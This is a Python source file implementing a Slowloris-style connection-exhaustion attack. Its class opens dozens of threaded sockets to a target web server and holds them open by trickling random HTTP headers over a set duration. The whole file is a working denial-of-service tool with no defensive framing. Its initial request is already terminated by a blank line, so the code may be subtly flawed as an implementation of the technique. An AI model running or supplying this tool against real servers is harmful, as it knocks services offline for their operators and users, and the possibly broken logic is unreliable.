import socket
import threading
import time
import random
from utils.network import parse_target

class ExhaustionAttacker:
    def __init__(self, target, num_conns=50):
        self.host, self.port = parse_target(target)
        self.num_conns = num_conns
        self.active = True

    def run(self, duration=120):
        for _ in range(self.num_conns):
            threading.Thread(target=self._slowloris_connection, daemon=True).start()
            time.sleep(0.1)
        time.sleep(duration)
        self.stop()

    def stop(self):
        self.active = False

    def _slowloris_connection(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        try:
            sock.connect((self.host, self.port))
            sock.send(f"GET / HTTP/1.1\r\nHost: {self.host}\r\n\r\n".encode())
            time.sleep(1)
            
            headers = [
                "User-Agent: Mozilla/5.0\r\n",
                "Accept: */*\r\n",
                "Connection: keep-alive\r\n",
                "X-Forwarded-For: 1.1.1.1\r\n"
            ]
            while self.active:
                sock.send(random.choice(headers).encode())
                time.sleep(2)
        except:
            pass
        finally:
            try:
                sock.close()
            except:
                pass